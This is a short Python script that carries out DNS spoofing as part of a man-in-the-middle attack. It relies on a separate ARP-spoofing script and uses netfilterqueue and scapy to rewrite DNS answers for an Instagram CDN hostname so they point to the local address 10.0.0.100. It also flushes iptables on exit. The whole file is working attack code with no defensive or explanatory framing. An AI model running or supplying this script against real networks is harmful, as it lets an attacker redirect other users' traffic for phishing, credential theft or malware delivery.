# need to run arp_spoof.py with python3 before running this script as it does IP forwarding
import netfilterqueue
import subprocess
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):  # Check if the packet is a DNS response
        # Now also check if it's a DNS query
        if scapy_packet.haslayer(scapy.DNSQR):  
            qname = scapy_packet[scapy.DNS].qd.qname
            if "static.cdninstagram.com." in str(qname):
                print("[+] Spoofing target")
                answer = scapy.DNSRR(rrname=qname, rdata="10.0.0.100")
                scapy_packet[scapy.DNS].an = answer
                # set the number of answers to 1
                scapy_packet[scapy.DNS].ancount = 1
                # delete the length and checksum fields to recalculate them
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.UDP].len
                del scapy_packet[scapy.UDP].chksum
                packet.set_payload(bytes(scapy_packet))
    packet.accept()


try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C ...")
    print("[+] Flushing IP tables")
    subprocess.call("iptables --flush", shell=True)
    print("[+] Stopping DNS Spoof")


